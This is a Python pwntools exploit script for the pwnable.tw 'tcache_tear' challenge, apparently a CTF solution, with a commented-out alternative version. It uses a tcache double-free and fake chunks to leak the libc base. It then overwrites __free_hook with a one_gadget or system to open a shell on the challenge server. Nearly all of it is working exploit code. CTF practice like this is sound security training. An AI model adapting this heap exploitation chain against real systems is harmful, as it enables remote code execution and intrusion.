#coding=utf-8
from pwn import *
# context.update(arch='amd64',os='linux')
context.update(arch='amd64',os='linux',log_level="debug")
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./tcache_tear')
if debug:
    # p = process('./tcache_tear')
    # libc = ELF('/lib/x86_64-linux-gnu/libc-2.28.so')
    p = process('./tcache_tear',env={'LD_PRELOAD':'./libc_64.so.6'})
    libc = ELF('./libc_64.so.6')
    offset = 0x3ebc40
    gadgets = [0x4f2c5,0x4f322,0x10a38c]
    # gdb.attach(p)
else:
    libc = ELF('./libc_64.so.6')
    p = remote('chall.pwnable.tw',10207)
    offset = 0x3ebc40
    gadgets = [0x4f2c5,0x4f322,0x10a38c]

def Malloc(size,content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Data:')
    p.send(content)

def Free():
    p.recvuntil('Your choice :')
    p.sendline('2')

def Info():
    p.recvuntil('Your choice :')
    p.sendline('3')

def Exit():
    p.recvuntil('Your choice :')
    p.sendline('4')

def exp():
    p.recvuntil('Name:')
    p.sendline('wz')
    Malloc(0x60,'a'*8)#idx0
    Free()
    Free()
    #Malloc(0x60,p64(0x60203d))#idx0
    Malloc(0x60,p64(0x602470))#idx0
    Malloc(0x60,'c'*8)#idx0
    ## write the next chunk of unsorted bin chunk
    Malloc(0x60,p64(0x0)+p64(0x21)+'a'*0x10+p64(0x20)+p64(0x21))
    #preapare for another double free
    Malloc(0x70,'a'*8)
    Free()
    Free()
    Malloc(0x70,p64(0x60203d))#a fake chunk ahead of 0x602060(name)
    Malloc(0x70,'a'*8)
    #Malloc(0x60,'a'*19+p64(0xfff7dcfa00000000)+p64(0x21)+'a'*0x10+p64(0x20)+p64(0x21)+'a'*8+p64(0x602060))#0x60203d
    Malloc(0x70,'a'*19+p64(0xfff7dcfa00000000)+p64(0x421)+'a'*0x28+p64(0x602060))#fake chunk
    Free()#unsorted bin leak
    Info()
    p.recvuntil('Name :')
    main_arena = u64(p.recv(8))-96
    libc_base = main_arena - offset
    log.success('libc base => ' + hex(libc_base))
    #get shell
    free_hook = libc_base + libc.symbols['__free_hook']
    log.success('free hook addr => ' + hex(free_hook))
    shell_addr = libc_base + gadgets[1]
    Malloc(0x80,'1'*8)
    Free()
    Free()
    Malloc(0x80,p64(free_hook-0x10))
    Malloc(0x80,'a'*8)
    log.success('before hack')
    Malloc(0x80,'a'*0x10+p64(shell_addr))
    Free()
    p.interactive()
    
exp()


# from pwn import *
# # p = process('./tcache_tear')
# p = remote('chall.pwnable.tw',10207)
# # gdb.attach(p)
# p.recvuntil("Name:")
# p.sendline('loeklvlh')
# libc = ELF('./libc_64.so.6')
# # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# def alloc(size,data):
#     p.sendline('1')
#     p.recvuntil('Size:')
#     p.sendline(str(size))
#     p.recvuntil('Data:')
#     p.sendline(data)
#     p.recvuntil('choice :')
# def delete():
#     p.sendline('2')
#     p.recvuntil('choice :')
# def info():
#     p.sendline('3')
#     p.recvuntil('Name :')
# p.recvuntil('choice :')
# alloc(0x8f,'hacked by loeklvlh')
# delete()
# delete()
# alloc(0x8f,p64(0x602050))
# alloc(0x8f,'hacked by loeklvlh')
# alloc(0x8f,p64(0x6020a0)+p64(0x91)+p64(0)*8+p64(0x6020e0))#0x602050
# alloc(0x7f,'loeklvlh')
# delete()
# delete()
# alloc(0x7f,p64(0x602050))
# alloc(0x7f,'loeklvlh')
# alloc(0x7f,'loeklvlh'+p64(0x91)) #0x602050
# alloc(0x7f,'a'*0x40+p64(0x602060)+p64(0x21)) #0x6020a0
# alloc(0x7f,p64(0)+p64(0x21)+p64(0)*3+p64(0x91))#0x6020e0
# alloc(0x7f,'loeklvlh')#0x602060
# delete()
# info()
# libc.address = u64(p.recv(6).ljust(8,'\x00'))-96-0x10-libc.symbols['__malloc_hook']
# print "libc address:",hex(libc.address)
# malloc_hook = libc.symbols['__malloc_hook']
# free_hook = libc.symbols['__free_hook']
# one_gadget = libc.address+0x4f2c5
# system = libc.symbols['system']
# bin_sh_addr = libc.search('/bin/sh\x00').next()
# alloc(0x4f,'loeklvlh')
# delete()
# delete()
# alloc(0x4f,p64(free_hook-0x8))
# alloc(0x4f,'loeklvlh')
# alloc(0x4f,'/bin/sh\x00'+p64(system))
# p.sendline('2')
# p.interactive()